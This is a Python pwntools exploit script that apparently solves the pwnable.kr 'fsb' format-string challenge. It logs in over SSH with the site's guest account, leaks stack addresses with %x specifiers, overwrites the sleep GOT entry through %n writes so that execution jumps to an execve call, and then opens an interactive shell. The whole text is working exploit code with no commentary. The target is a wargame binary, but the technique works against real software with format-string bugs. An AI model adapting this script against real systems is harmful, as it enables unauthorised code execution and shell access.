from pwn import *

context.log_level = 'debug'
locale = 0
if locale:
    p = process('./fsb')
else:
    p = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')

elf = ELF('./fsb')

sleep_got = elf.got['sleep']
execve = 0x080486ab

p.recvuntil('strings(1)\n')
payload = '%14$x%18$x'
p.sendline(payload)

esp = int(p.recv(8),16) - 0x50
ebp_main = int(p.recv(8),16)
offset = (ebp_main - esp)/4
log.success('esp_fsb: ' + hex(esp))
log.success('ebp main: '+ hex(ebp_main))
log.success('offset: ' + str(offset))


p.recvuntil('strings(2)\n')
payload = '%%%dc'%(sleep_got) + '%18$n'
log.success(payload)
p.sendline(payload)

#gdb.attach(p)
p.recvuntil('strings(3)\n')
payload = '%%%dc'%(execve&0xffffffff) + '%%%d$n'%(offset)
log.success(payload)
p.sendline(payload)

p.recvuntil('strings(4)\n')
payload = 'aaqaaaaaa\0'
p.sendline(payload)

#sleep(3)
p.interactive()
